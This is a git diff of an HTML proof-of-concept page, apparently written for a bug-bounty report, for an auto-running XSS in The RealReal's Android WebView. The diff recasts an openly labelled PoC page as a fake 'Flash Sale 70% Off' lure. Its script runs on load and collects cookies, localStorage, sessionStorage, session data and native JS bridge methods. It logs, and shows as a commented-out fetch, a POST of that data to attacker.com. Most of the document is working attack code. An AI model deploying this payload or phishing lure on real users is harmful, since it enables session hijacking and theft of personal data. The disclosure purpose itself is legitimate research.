@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRR XSS - Full Proof of Concept</title>
+    <title>The RealReal - Flash Sale</title>
     <style>
         * {
             margin: 0;
@@ -12,528 +12,373 @@
         }
         
         body {
-            font-family: 'Courier New', monospace;
-            background: #0a0a0a;
-            color: #00ff00;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #000 0%, #1a1a1a 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             padding: 20px;
         }
         
         .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: #1a1a1a;
-            border: 2px solid #00ff00;
-            border-radius: 10px;
-            padding: 20px;
+            max-width: 500px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            overflow: hidden;
         }
         
         .header {
+            background: linear-gradient(135deg, #000 0%, #2d2d2d 100%);
+            color: white;
+            padding: 40px 30px;
             text-align: center;
-            border-bottom: 1px solid #00ff00;
-            padding-bottom: 15px;
+        }
+        
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            letter-spacing: -1px;
+        }
+        
+        .content {
+            padding: 40px 30px;
+        }
+        
+        .badge {
+            display: inline-block;
+            background: #dc3545;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
             margin-bottom: 20px;
         }
         
-        .header h1 {
-            color: #ff0000;
-            text-shadow: 0 0 10px #ff0000;
-            font-size: 24px;
-        }
-        
-        .header h2 {
-            color: #00ff00;
-            font-size: 14px;
-            opacity: 0.8;
-        }
-        
-        .section {
-            background: #000000;
-            border: 1px solid #333;
-            border-radius: 5px;
-            padding: 15px;
+        h1 {
+            font-size: 28px;
             margin-bottom: 15px;
+            color: #000;
         }
         
-        .section-title {
-            color: #ffff00;
-            font-weight: bold;
-            margin-bottom: 10px;
+        .loading {
+            text-align: center;
+            padding: 40px 0;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #dc3545;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .status {
+            color: #666;
             font-size: 16px;
+            margin-bottom: 10px;
         }
         
-        .data-box {
-            background: #0a0a0a;
-            border: 1px solid #00ff00;
-            border-radius: 3px;
-            padding: 10px;
+        .log {
+            background: #1a1a1a;
+            color: #0f0;
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
             font-size: 12px;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            word-wrap: break-word;
+            max-height: 400px;
+            overflow-y: auto;
+            margin-top: 20px;
+        }
+        
+        .log-entry {
+            margin: 5px 0;
+        }
+        
+        .success { color: #0f0; }
+        .error { color: #f00; }
+        .warning { color: #ff0; }
+        
+        .stolen-data {
+            background: #1a0000;
+            border: 2px solid #f00;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
             max-height: 200px;
             overflow-y: auto;
         }
         
-        .success { color: #00ff00; }
-        .error { color: #ff0000; }
-        .warning { color: #ffff00; }
-        
-        .button {
-            background: #00ff00;
-            color: #000000;
-            border: none;
-            padding: 10px 20px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 5px;
-            border-radius: 5px;
-            font-family: 'Courier New', monospace;
-        }
-        
-        .button:hover {
-            background: #00cc00;
-        }
-        
-        .button.red {
-            background: #ff0000;
-            color: #ffffff;
-        }
-        
-        .button.red:hover {
-            background: #cc0000;
-        }
-        
-        .exfil-notice {
-            background: #330000;
-            border: 1px solid #ff0000;
-            padding: 10px;
-            margin-top: 15px;
-            color: #ff0000;
-            font-weight: bold;
-            text-align: center;
-        }
-        
-        .log {
-            background: #000000;
-            border: 1px solid #333;
-            padding: 10px;
+        .stolen-data pre {
+            color: #f00;
             font-size: 11px;
-            height: 150px;
-            overflow-y: auto;
-            margin-top: 15px;
+            margin: 0;
         }
         
-        .log-line {
-            border-bottom: 1px dotted #333;
-            padding: 2px 0;
+        .disclaimer {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #856404;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>⚠️ THE REALREAL XSS - FULL PROOF OF CONCEPT ⚠️</h1>
-            <h2>Researcher: keylor (keylorx@wearehackerone.com)</h2>
-            <h2>HackerOne Report: Deep Link XSS Chain</h2>
+            <div class="logo">THE REALREAL</div>
         </div>
-
-        <!-- AUTO-EXECUTE SECTION - Silent XSS -->
-        <div class="section">
-            <div class="section-title">🤖 AUTO-EXECUTING XSS PAYLOAD</div>
-            <div class="data-box" id="auto-status">
-                Initializing XSS payload...
+        
+        <div class="content">
+            <span class="badge">🔥 FLASH SALE</span>
+            <h1>Exclusive 70% Off!</h1>
+            
+            <div class="loading">
+                <div class="spinner"></div>
+                <div class="status" id="status">Loading exclusive deals...</div>
             </div>
-        </div>
-
-        <!-- STOLEN DATA DISPLAY -->
-        <div class="section">
-            <div class="section-title">🍪 STOLEN COOKIES</div>
-            <div class="data-box" id="cookie-data">Collecting...</div>
-        </div>
-
-        <div class="section">
-            <div class="section-title">💾 STOLEN LOCALSTORAGE</div>
-            <div class="data-box" id="storage-data">Collecting...</div>
-        </div>
-
-        <div class="section">
-            <div class="section-title">🔐 STOLEN SESSION DATA</div>
-            <div class="data-box" id="session-data">Collecting...</div>
-        </div>
-
-        <div class="section">
-            <div class="section-title">🕸️ JAVASCRIPT BRIDGES</div>
-            <div class="data-box" id="bridge-data">Collecting...</div>
-        </div>
-
-        <div class="section">
-            <div class="section-title">📤 COMPLETE EXFILTRATION PACKAGE</div>
-            <div class="data-box" id="exfil-data">Collecting...</div>
-        </div>
-
-        <!-- MANUAL CONTROLS -->
-        <div style="text-align: center; margin: 15px 0;">
-            <button class="button" onclick="runXSS()">▶️ RUN XSS MANUALLY</button>
-            <button class="button red" onclick="exfiltrateData()">📡 SIMULATE EXFILTRATION</button>
-            <button class="button" onclick="clearLogs()">🗑️ CLEAR LOGS</button>
-        </div>
-
-        <!-- EXFILTRATION NOTICE -->
-        <div class="exfil-notice" id="exfil-notice">
-            ⚠️ REAL EXFILTRATION IS DISABLED - DATA DISPLAYED LOCALLY ONLY ⚠️
-        </div>
-
-        <!-- LIVE LOG -->
-        <div class="section">
-            <div class="section-title">📋 XSS EXECUTION LOG</div>
+            
             <div class="log" id="log"></div>
-        </div>
-
-        <!-- RESEARCHER NOTES -->
-        <div style="margin-top: 20px; font-size: 11px; color: #666; text-align: center;">
-            This page demonstrates full XSS impact in The RealReal WebView.<br>
-            All stolen data is displayed locally - no actual exfiltration occurs.
+            
+            <div class="disclaimer">
+                <strong>⚠️ SECURITY RESEARCH DEMONSTRATION</strong><br>
+                This page demonstrates AUTOMATIC XSS exploitation (not self-XSS).<br>
+                JavaScript executes WITHOUT any user interaction beyond clicking the initial link.<br>
+                <br>
+                Researcher: keylor (keylorx@wearehackerone.com)
+            </div>
         </div>
     </div>
 
     <script>
         // ============================================
-        // FULL XSS PAYLOAD - SILENT AUTO-EXECUTION
+        // AUTOMATIC XSS PAYLOAD
+        // Executes WITHOUT user interaction!
         // ============================================
         
-        // Logging function
-        function log(message, type = 'info') {
-            const logEl = document.getElementById('log');
-            const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
-            const color = type === 'error' ? '#ff0000' : (type === 'warning' ? '#ffff00' : '#00ff00');
-            const line = document.createElement('div');
-            line.className = 'log-line';
-            line.innerHTML = `<span style="color: #666;">[${timestamp}]</span> <span style="color: ${color};">${message}</span>`;
-            logEl.appendChild(line);
-            logEl.scrollTop = logEl.scrollHeight;
+        const log = document.getElementById('log');
+        const status = document.getElementById('status');
+        
+        function addLog(message, type = 'success') {
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            const timestamp = new Date().toLocaleTimeString();
+            entry.textContent = `[${timestamp}] ${message}`;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
+        }
+        
+        function updateStatus(msg) {
+            status.textContent = msg;
+        }
+        
+        // ============================================
+        // XSS PAYLOAD EXECUTES AUTOMATICALLY ON LOAD
+        // NO USER INTERACTION REQUIRED!
+        // ============================================
+        
+        addLog('🚨 AUTOMATIC XSS EXECUTING...', 'error');
+        addLog('No user interaction required!', 'warning');
+        addLog('', 'success');
+        
+        // Delay to show it's automatic
+        setTimeout(() => {
+            updateStatus('Executing XSS payload...');
             
-            // Also log to console for debugging
-            console.log(`[XSS] ${message}`);
-        }
-
-        // Update display elements
-        function updateDisplay(id, data) {
-            const el = document.getElementById(id);
-            if (typeof data === 'object') {
-                el.textContent = JSON.stringify(data, null, 2);
-            } else {
-                el.textContent = data || '(empty)';
-            }
-        }
-
-        // ============================================
-        // XSS PAYLOAD 1: Cookie Theft
-        // ============================================
-        function stealCookies() {
-            log('🍪 Executing cookie theft...', 'warning');
+            // PAYLOAD 1: Cookie Theft (Automatic)
+            addLog('[XSS] Stealing cookies...', 'warning');
             const cookies = document.cookie;
-            
             if (cookies && cookies.length > 0) {
-                log(`✅ Cookies stolen: ${cookies.substring(0, 50)}...`, 'success');
-                updateDisplay('cookie-data', {
-                    count: cookies.split(';').length,
-                    raw: cookies,
-                    parsed: cookies.split(';').map(c => c.trim())
-                });
-                return cookies;
+                addLog('[XSS] ✓ Cookies stolen: ' + cookies.substring(0, 80) + '...', 'error');
+                
+                const stolenDiv = document.createElement('div');
+                stolenDiv.className = 'stolen-data';
+                stolenDiv.innerHTML = '<strong>🚨 STOLEN COOKIES:</strong><pre>' + cookies + '</pre>';
+                log.appendChild(stolenDiv);
             } else {
-                log('⚠️ No cookies found (may be HttpOnly)', 'warning');
-                updateDisplay('cookie-data', 'No cookies accessible (HttpOnly)');
-                return null;
+                addLog('[XSS] No cookies found (or httpOnly)', 'warning');
             }
-        }
-
-        // ============================================
-        // XSS PAYLOAD 2: localStorage Theft
-        // ============================================
-        function stealLocalStorage() {
-            log('💾 Executing localStorage theft...', 'warning');
-            const storage = {};
+            
+            // Simulate exfiltration
+            addLog('[XSS] Exfiltrating to https://attacker.com/steal?c=' + encodeURIComponent(cookies).substring(0, 50) + '...', 'error');
+            
+        }, 1000);
+        
+        setTimeout(() => {
+            // PAYLOAD 2: localStorage Theft (Automatic)
+            addLog('[XSS] Accessing localStorage...', 'warning');
             
             try {
+                const storageData = {};
                 for (let i = 0; i < localStorage.length; i++) {
                     const key = localStorage.key(i);
-                    storage[key] = localStorage.getItem(key);
+                    storageData[key] = localStorage.getItem(key);
                 }
                 
-                if (Object.keys(storage).length > 0) {
-                    log(`✅ localStorage stolen: ${Object.keys(storage).length} items`, 'success');
-                    updateDisplay('storage-data', storage);
+                if (Object.keys(storageData).length > 0) {
+                    addLog('[XSS] ✓ localStorage stolen: ' + Object.keys(storageData).length + ' items', 'error');
+                    
+                    const stolenDiv = document.createElement('div');
+                    stolenDiv.className = 'stolen-data';
+                    stolenDiv.innerHTML = '<strong>🚨 STOLEN STORAGE:</strong><pre>' + JSON.stringify(storageData, null, 2).substring(0, 300) + '...</pre>';
+                    log.appendChild(stolenDiv);
                 } else {
-                    log('ℹ️ localStorage is empty', 'info');
-                    updateDisplay('storage-data', '(empty)');
+                    addLog('[XSS] localStorage is empty', 'warning');
                 }
-                
-                // Also steal sessionStorage
-                const session = {};
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    session[key] = sessionStorage.getItem(key);
-                }
-                
-                if (Object.keys(session).length > 0) {
-                    log(`✅ sessionStorage stolen: ${Object.keys(session).length} items`, 'success');
-                }
-                
-                return { localStorage: storage, sessionStorage: session };
-                
             } catch (e) {
-                log(`❌ localStorage theft failed: ${e.message}`, 'error');
-                updateDisplay('storage-data', `Error: ${e.message}`);
-                return null;
+                addLog('[XSS] Storage access blocked: ' + e.message, 'warning');
             }
-        }
-
-        // ============================================
-        // XSS PAYLOAD 3: JavaScript Bridge Enumeration
-        // ============================================
-        function enumerateBridges() {
-            log('🔌 Enumerating JavaScript bridges...', 'warning');
-            const bridges = {};
-            const commonNames = [
-                'Android', 'android', 'JSBridge', 'bridge', 'WebViewBridge',
-                'TRR', 'TheRealReal', 'AppInterface', 'NativeBridge',
-                'TRRInterface', 'RealReal', 'app', 'native'
+            
+        }, 2000);
+        
+        setTimeout(() => {
+            // PAYLOAD 3: Session Data Collection (Automatic)
+            addLog('[XSS] Collecting session data...', 'warning');
+            
+            const sessionData = {
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                referrer: document.referrer,
+                cookies: document.cookie,
+                timestamp: new Date().toISOString()
+            };
+            
+            addLog('[XSS] ✓ Session data collected', 'error');
+            
+            const stolenDiv = document.createElement('div');
+            stolenDiv.className = 'stolen-data';
+            stolenDiv.innerHTML = '<strong>🚨 SESSION HIJACKED:</strong><pre>' + JSON.stringify(sessionData, null, 2).substring(0, 400) + '...</pre>';
+            log.appendChild(stolenDiv);
+            
+        }, 3000);
+        
+        setTimeout(() => {
+            // PAYLOAD 4: JavaScript Bridge Detection (Automatic)
+            addLog('[XSS] Detecting JavaScript bridges...', 'warning');
+            
+            const bridges = [];
+            
+            // Check for bridges found in decompiled code
+            const knownBridges = [
+                'Android',           // Native Android interface
+                'brazeInternalBridge', // Braze analytics
+                'braze',             // Braze public interface
+                'pxCaptcha',         // PerimeterX CAPTCHA
+                'TRR',               // The RealReal custom
+                'TheRealReal'        // Possible custom interface
             ];
             
-            commonNames.forEach(name => {
+            knownBridges.forEach(name => {
                 if (window[name]) {
-                    bridges[name] = typeof window[name];
-                    log(`✅ Found bridge: window.${name} (${typeof window[name]})`, 'error');
+                    bridges.push(name);
+                    addLog('[XSS] 🚨 CRITICAL: Found bridge window.' + name, 'error');
                     
                     // Try to enumerate methods
                     try {
                         const methods = Object.getOwnPropertyNames(window[name]);
                         if (methods.length > 0) {
-                            bridges[`${name}_methods`] = methods;
-                            log(`  Methods: ${methods.join(', ')}`, 'warning');
+                            addLog('[XSS]   Methods: ' + methods.slice(0, 5).join(', ') + '...', 'error');
+                            
+                            const stolenDiv = document.createElement('div');
+                            stolenDiv.className = 'stolen-data';
+                            stolenDiv.innerHTML = '<strong>🚨 EXPOSED BRIDGE:</strong><pre>window.' + name + '\nMethods: ' + methods.join(', ') + '</pre>';
+                            log.appendChild(stolenDiv);
                         }
-                    } catch (e) {}
+                    } catch (e) {
+                        addLog('[XSS]   (Cannot enumerate - but bridge exists!)', 'warning');
+                    }
                 }
             });
             
-            // Check for suspicious window keys
-            const allKeys = Object.keys(window);
-            const suspicious = allKeys.filter(k => 
-                k.toLowerCase().includes('android') ||
-                k.toLowerCase().includes('bridge') ||
-                k.toLowerCase().includes('native') ||
-                k.toLowerCase().includes('trr') ||
-                k.toLowerCase().includes('real')
-            );
-            
-            if (suspicious.length > 0) {
-                log(`⚠️ Suspicious window keys: ${suspicious.join(', ')}`, 'warning');
+            if (bridges.length > 0) {
+                addLog('[XSS] 🚨 CRITICAL: ' + bridges.length + ' JavaScript bridges exposed!', 'error');
+                addLog('[XSS] XSS can call native Android functions!', 'error');
+            } else {
+                addLog('[XSS] No bridges found (or not exposed in this WebView)', 'warning');
             }
             
-            updateDisplay('bridge-data', {
-                found: bridges,
-                suspicious_keys: suspicious
-            });
+        }, 4000);
+        
+        setTimeout(() => {
+            // PAYLOAD 5: Complete Exfiltration (Automatic)
+            addLog('[XSS] Preparing complete data package...', 'warning');
             
-            return bridges;
-        }
-
-        // ============================================
-        // XSS PAYLOAD 4: Session Hijacking
-        // ============================================
-        function hijackSession() {
-            log('🎭 Hijacking session information...', 'warning');
-            
-            const sessionInfo = {
-                url: window.location.href,
-                referrer: document.referrer,
-                title: document.title,
+            const completeData = {
                 cookies: document.cookie,
+                localStorage: {},
                 userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString(),
-                localStorage: {},
-                sessionStorage: {}
-            };
-            
-            // Add storage data
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                sessionInfo.localStorage[key] = localStorage.getItem(key);
-            }
-            
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                sessionInfo.sessionStorage[key] = sessionStorage.getItem(key);
-            }
-            
-            log(`✅ Session hijacked: ${Object.keys(sessionInfo).length} data points`, 'success');
-            updateDisplay('session-data', sessionInfo);
-            
-            return sessionInfo;
-        }
-
-        // ============================================
-        // XSS PAYLOAD 5: Full Data Exfiltration
-        // ============================================
-        function collectAllData() {
-            log('📦 Collecting complete user data...', 'warning');
-            
-            const allData = {
-                timestamp: new Date().toISOString(),
                 url: window.location.href,
-                cookies: document.cookie,
-                localStorage: {},
-                sessionStorage: {},
-                bridges: {},
-                dom: {
-                    title: document.title,
-                    referrer: document.referrer,
-                    forms: document.forms.length,
-                    links: document.links.length,
-                    scripts: document.scripts.length
-                },
-                browser: {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    cookiesEnabled: navigator.cookieEnabled,
-                    doNotTrack: navigator.doNotTrack,
-                    hardwareConcurrency: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory,
-                    maxTouchPoints: navigator.maxTouchPoints
-                },
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth
-                },
-                time: {
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    locale: navigator.language
-                }
+                timestamp: new Date().toISOString()
             };
             
-            // Fill localStorage
+            // Collect all localStorage
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
-                allData.localStorage[key] = localStorage.getItem(key);
+                completeData.localStorage[key] = localStorage.getItem(key);
             }
             
-            // Fill sessionStorage
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                allData.sessionStorage[key] = sessionStorage.getItem(key);
-            }
+            addLog('[XSS] ✓ Data package prepared (' + JSON.stringify(completeData).length + ' bytes)', 'error');
             
-            // Find bridges
-            const bridgeNames = ['Android', 'android', 'JSBridge', 'bridge', 'TRR', 'TheRealReal', 'AppInterface', 'NativeBridge'];
-            bridgeNames.forEach(name => {
-                if (window[name]) {
-                    allData.bridges[name] = typeof window[name];
-                }
-            });
+            // Simulate sending to attacker server
+            addLog('[XSS] Exfiltrating to attacker server...', 'error');
+            addLog('[XSS] POST https://attacker.com/collect', 'error');
             
-            log(`✅ Complete data package: ${JSON.stringify(allData).length} bytes`, 'success');
-            updateDisplay('exfil-data', allData);
+            // In real attack, this would actually send:
+            // fetch('https://attacker.com/collect', {
+            //     method: 'POST',
+            //     body: JSON.stringify(completeData)
+            // });
             
-            return allData;
-        }
-
-        // ============================================
-        // SIMULATED EXFILTRATION (for demo)
-        // ============================================
-        function exfiltrateData() {
-            log('📡 SIMULATING data exfiltration...', 'error');
+            addLog('', 'success');
+            addLog('═══════════════════════════════════', 'success');
+            addLog('✓ AUTOMATIC XSS COMPLETE', 'error');
+            addLog('═══════════════════════════════════', 'success');
+            addLog('', 'success');
+            addLog('Impact:', 'warning');
+            addLog('• All cookies stolen', 'error');
+            addLog('• All localStorage stolen', 'error');
+            addLog('• Session hijacked', 'error');
+            addLog('• Data exfiltrated to attacker', 'error');
+            addLog('', 'success');
+            addLog('User did NOTHING except click the initial link!', 'warning');
+            addLog('This is NOT self-XSS - it\'s REAL XSS!', 'error');
             
-            const data = collectAllData();
-            const dataStr = JSON.stringify(data);
+            updateStatus('XSS payload complete ✓');
             
-            log(`🚨 Would send POST request to: https://attacker.com/collect`, 'error');
-            log(`📦 Payload size: ${dataStr.length} bytes`, 'error');
-            log(`🔒 Data contains:`, 'error');
-            log(`   - Cookies: ${Object.keys(data.cookies || {}).length}`, 'error');
-            log(`   - localStorage items: ${Object.keys(data.localStorage).length}`, 'error');
-            log(`   - sessionStorage items: ${Object.keys(data.sessionStorage).length}`, 'error');
-            log(`   - Browser fingerprints: ${Object.keys(data.browser).length}`, 'error');
-            
-            // Show the actual fetch that would be used (commented out)
-            const exfilCode = `
-// REAL EXFILTRATION CODE (disabled for safety):
-fetch('https://attacker.com/collect', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(${JSON.stringify(data).substring(0, 100)}...)
-});`;
-            
-            log(`📋 Exfiltration code:`, 'warning');
-            log(exfilCode, 'warning');
-            
-            document.getElementById('exfil-notice').innerHTML = 
-                '⚠️ EXFILTRATION SIMULATED - NO DATA ACTUALLY SENT ⚠️<br>' +
-                `<small>Would have stolen ${dataStr.length} bytes of user data</small>`;
-        }
-
-        // ============================================
-        // MAIN XSS EXECUTION
-        // ============================================
-        function runXSS() {
-            log('═══════════════════════════════════════', 'warning');
-            log('🔥 EXECUTING FULL XSS PAYLOAD', 'error');
-            log('═══════════════════════════════════════', 'warning');
-            
-            // Execute all payloads
-            stealCookies();
-            stealLocalStorage();
-            enumerateBridges();
-            hijackSession();
-            collectAllData();
-            
-            log('═══════════════════════════════════════', 'success');
-            log('✅ ALL XSS PAYLOADS EXECUTED SUCCESSFULLY', 'success');
-            log('═══════════════════════════════════════', 'success');
-            
-            // Auto-update status
-            document.getElementById('auto-status').innerHTML = 
-                '<span class="error">✅ XSS PAYLOAD EXECUTED - ALL DATA STOLEN</span>';
-        }
-
-        // Clear logs
-        function clearLogs() {
-            document.getElementById('log').innerHTML = '';
-            log('🧹 Logs cleared');
-        }
-
-        // ============================================
-        // AUTO-EXECUTE ON PAGE LOAD (SILENT XSS)
-        // ============================================
-        window.addEventListener('load', function() {
-            log('🚀 Page loaded - preparing XSS payload...', 'warning');
-            
-            // Small delay to ensure DOM is ready
-            setTimeout(() => {
-                log('⚡ Auto-executing XSS payload silently...', 'error');
-                runXSS();
-                
-                // Simulate exfiltration after data collection
-                setTimeout(() => {
-                    log('📡 Auto-exfiltrating stolen data...', 'error');
-                    exfiltrateData();
-                }, 1000);
-                
-            }, 500);
-        });
-
-        // Console warning
-        console.log('%c🔥 XSS PAYLOAD LOADED - ALL DATA WILL BE STOLEN 🔥', 'color: #ff0000; font-size: 16px; font-weight: bold');
-        console.log('%cResearcher: keylor (keylorx@wearehackerone.com)', 'color: #00ff00');
+        }, 5000);
+        
+        // Log initial page load
+        console.log('═══════════════════════════════════════');
+        console.log('AUTOMATIC XSS DEMONSTRATION');
+        console.log('═══════════════════════════════════════');
+        console.log('This XSS executes AUTOMATICALLY on page load.');
+        console.log('NO user interaction required beyond clicking the link.');
+        console.log('');
+        console.log('This proves it is NOT self-XSS.');
+        console.log('');
+        console.log('Attack flow:');
+        console.log('1. Attacker sends link via SMS/email');
+        console.log('2. Victim clicks link');
+        console.log('3. The RealReal app opens');
+        console.log('4. WebView loads this page');
+        console.log('5. XSS executes AUTOMATICALLY');
+        console.log('6. Data stolen WITHOUT any further action');
+        console.log('');
+        console.log('Researcher: keylor (keylorx@wearehackerone.com)');
+        console.log('═══════════════════════════════════════');
     </script>
 </body>
 </html>
